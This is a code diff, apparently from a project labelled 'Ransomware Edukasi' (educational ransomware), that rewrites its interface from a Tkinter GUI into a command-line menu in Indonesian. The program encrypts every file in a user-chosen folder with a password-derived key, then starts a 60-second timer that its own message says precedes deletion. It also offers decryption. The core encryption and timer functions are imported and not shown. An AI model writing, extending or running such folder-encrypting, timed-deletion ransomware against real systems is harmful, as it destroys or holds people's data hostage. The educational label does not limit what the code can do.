@@ -1,64 +1,55 @@
-import tkinter as tk
-from tkinter import filedialog
+import os
+import hashlib
 from encryptor import *
 from timer import start_timer
-import hashlib
+from cryptography.fernet import Fernet
 
-key = None
-status_log = []
+def clear_screen():
+    os.system("clear" if os.name == "posix" else "cls")
 
-def update_status(msg):
-    status_log.append(msg)
-    log_text.config(state='normal')
-    log_text.insert(tk.END, msg + '\n')
-    log_text.config(state='disabled')
-    with open("log.txt", "a") as log:
-        log.write(msg + '\n')
+def menu():
+    clear_screen()
+    print("="*50)
+    print("📁  RANSOMWARE EDUKASI - CLI VERSION")
+    print("="*50)
+    print("[1] 🔐 Enkripsi Folder")
+    print("[2] 🔓 Dekripsi Folder")
+    print("[3] ❌ Keluar")
+    print("="*50)
 
-def select_folder():
-    path = filedialog.askdirectory()
-    folder_var.set(path)
+def get_input():
+    password = input("🔑 Masukkan Password: ")
+    folder = input("📁 Masukkan Path Folder Target: ")
+    return password, folder
 
-def encrypt_action():
-    global key
-    password = password_entry.get()
-    if not password or not folder_var.get():
-        return update_status("⚠️ Password dan folder wajib diisi!")
-    key = generate_key(password)
-    for file_path in get_all_files(folder_var.get()):
-        if encrypt_file(file_path, key):
-            update_status(f"🔐 Enkripsi: {file_path}")
-    start_timer(60, folder_var.get(), update_status)
+def main():
+    while True:
+        menu()
+        choice = input("Pilih opsi (1/2/3): ").strip()
+        if choice == "1":
+            password, folder = get_input()
+            key = generate_key(password)
+            files = get_all_files(folder)
+            for f in files:
+                if encrypt_file(f, key):
+                    print(f"✅ Enkripsi: {f}")
+            print("🕒 Timer 60 detik sebelum penghapusan...")
+            start_timer(60, folder, print)
+            input("Tekan ENTER untuk kembali ke menu...")
+        elif choice == "2":
+            password, folder = get_input()
+            key = generate_key(password)
+            files = get_all_files(folder)
+            for f in files:
+                if decrypt_file(f, key):
+                    print(f"✅ Dekripsi: {f}")
+            input("Tekan ENTER untuk kembali ke menu...")
+        elif choice == "3":
+            print("👋 Keluar...")
+            break
+        else:
+            print("⚠️ Opsi tidak valid.")
+            input("Tekan ENTER untuk kembali...")
 
-def decrypt_action():
-    global key
-    password = password_entry.get()
-    if not password:
-        return update_status("⚠️ Password diperlukan untuk dekripsi!")
-    key = generate_key(password)
-    for file_path in get_all_files(folder_var.get()):
-        if decrypt_file(file_path, key):
-            update_status(f"🔓 Dekripsi: {file_path}")
-
-root = tk.Tk()
-root.title("Ransomware Edukasi")
-root.geometry("540x500")
-root.configure(bg="#1e1e1e")
-
-tk.Label(root, text="📂 Pilih Folder Target:", fg="white", bg="#1e1e1e").pack(pady=5)
-folder_var = tk.StringVar()
-tk.Entry(root, textvariable=folder_var, width=50).pack()
-tk.Button(root, text="Browse", command=select_folder).pack(pady=5)
-
-tk.Label(root, text="🔑 Masukkan Password:", fg="white", bg="#1e1e1e").pack(pady=5)
-password_entry = tk.Entry(root, show="*", width=50)
-password_entry.pack()
-
-tk.Button(root, text="🔐 Enkripsi", command=encrypt_action, bg="red", fg="white").pack(pady=10)
-tk.Button(root, text="🔓 Dekripsi", command=decrypt_action, bg="green", fg="white").pack(pady=5)
-
-tk.Label(root, text="📄 Status:", fg="white", bg="#1e1e1e").pack()
-log_text = tk.Text(root, height=10, width=65, state='disabled', bg="black", fg="lime")
-log_text.pack(pady=5)
-
-root.mainloop()
+if __name__ == "__main__":
+    main()
